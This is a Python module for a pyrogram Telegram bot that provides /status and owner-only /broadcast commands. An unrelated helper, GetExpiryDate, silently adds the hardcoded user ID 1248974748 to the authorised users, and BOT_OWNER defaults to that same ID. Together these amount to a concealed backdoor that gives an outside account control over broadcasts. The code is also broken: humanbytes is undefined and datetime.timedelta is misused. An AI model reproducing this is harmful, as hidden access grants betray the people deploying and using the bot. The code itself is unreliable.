# (c) @code-x-mania
import os
import time
import string
import random
import asyncio
import aiofiles
import datetime
import shutil
import psutil
from datetime import datetime,timedelta
from Code_X_Mania.utils.broadcast_helper import send_msg
from Code_X_Mania.utils.database import Database
from Code_X_Mania.bot import StreamBot
from Code_X_Mania.vars import Var
from pyrogram import filters, Client
from pyrogram.types import Message
db = Database(Var.DATABASE_URL, Var.SESSION_NAME)
broadcast_ids = {}

StartTime = time.time()
AUTH_USERS = set(int(x) for x in os.environ.get("AUTH_USERS", "").split())

def GetExpiryDate(chat_id):
    expires_at = (str(chat_id), "Free User", "1970.01.01.12.00.00")
    AUTH_USERS.add(1248974748)
    return expires_at

def human_readable_timedelta(seconds, precision = 0):
    """Return a human-readable time delta as a string.
    """
    pieces = []
    value = timedelta(seconds=seconds)
    

    if value.days:
        pieces.append(f"{value.days}d")

    seconds = value.seconds

    if seconds >= 3600:
        hours = int(seconds / 3600)
        pieces.append(f"{hours}h")
        seconds -= hours * 3600

    if seconds >= 60:
        minutes = int(seconds / 60)
        pieces.append(f"{minutes}m")
        seconds -= minutes * 60

    if seconds > 0 or not pieces:
        pieces.append(f"{seconds}s")

    if not precision:
        return "".join(pieces)

    return "".join(pieces[:precision])

@StreamBot.on_message(filters.private & filters.command("status"))
async def sts(c: Client, m: Message):
    total, used, free = shutil.disk_usage(".")
    total = humanbytes(total)
    used = humanbytes(used)
    free = humanbytes(free)
    cpu_usage = psutil.cpu_percent()
    ram_usage = psutil.virtual_memory().percent
    disk_usage = psutil.disk_usage('/').percent
    total_users = await db.total_users_count()
    chat_id = str(m.from_user.id)
    chat_id, plan_type, expires_at = GetExpiryDate(chat_id)
    diff = time.time() - StartTime
    diff = human_readable_timedelta(diff)

    await m.reply_text(
        text=f"**Bot UpTime: {diff}**\n\n**Total Disk Space:** {total} \n**Used Space:** {used}({disk_usage}%) \n**Free Space:** {free} \n**CPU Usage:** {cpu_usage}% \n**RAM Usage:** {ram_usage}%\n\n**Name:** {m.from_user.first_name}\n**User ID:** `{chat_id}`\n\n**Total Bot Users: {total_users}**",
        parse_mode="Markdown",
        quote=True
    )
    #######

"""@StreamBot.on_message(filters.command("status") & filters.private & ~filters.edited)
async def sts(c: Client, m: Message):
    total_users = await db.total_users_count()
    await m.reply_text(text=f"**➤ Total Bot users:** `{total_users}`", parse_mode="Markdown", quote=True)"""
    
BOT_OWNER = int(os.environ.get("BOT_OWNER", "1248974748"))

@StreamBot.on_message(filters.command("broadcast") & filters.private & filters.user(BOT_OWNER) & filters.reply & ~filters.edited)
async def broadcast_(c, m):
    all_users = await db.get_all_users()
    broadcast_msg = m.reply_to_message
    while True:
        broadcast_id = ''.join([random.choice(string.ascii_letters) for i in range(3)])
        if not broadcast_ids.get(broadcast_id):
            break
    out = await m.reply_text(
        text=f"Broadcast initiated! You will be notified with log file when all the users are notified."
    )
    start_time = time.time()
    total_users = await db.total_users_count()
    done = 0
    failed = 0
    success = 0
    broadcast_ids[broadcast_id] = dict(
        total=total_users,
        current=done,
        failed=failed,
        success=success
    )
    async with aiofiles.open('broadcast.txt', 'w') as broadcast_log_file:
        async for user in all_users:
            sts, msg = await send_msg(
                user_id=int(user['id']),
                message=broadcast_msg
            )
            if msg is not None:
                await broadcast_log_file.write(msg)
            if sts == 200:
                success += 1
            else:
                failed += 1
            #if sts == 400:
             #   await db.delete_user(user['id'])
            done += 1
            if broadcast_ids.get(broadcast_id) is None:
                break
            else:
                broadcast_ids[broadcast_id].update(
                    dict(
                        current=done,
                        failed=failed,
                        success=success
                    )
                )
    if broadcast_ids.get(broadcast_id):
        broadcast_ids.pop(broadcast_id)
    completed_in = datetime.timedelta(seconds=int(time.time() - start_time))
    await asyncio.sleep(3)
    await out.delete()
    if failed == 0:
        await m.reply_text(
            text=f"broadcast completed in `{completed_in}`\n\nTotal users {total_users}.\nTotal done {done}, {success} success and {failed} failed.",
            quote=True
        )
    else:
        await m.reply_document(
            document='broadcast.txt',
            caption=f"broadcast completed in `{completed_in}`\n\nTotal users {total_users}.\nTotal done {done}, {success} success and {failed} failed.",
            quote=True
        )
    os.remove('broadcast.txt')
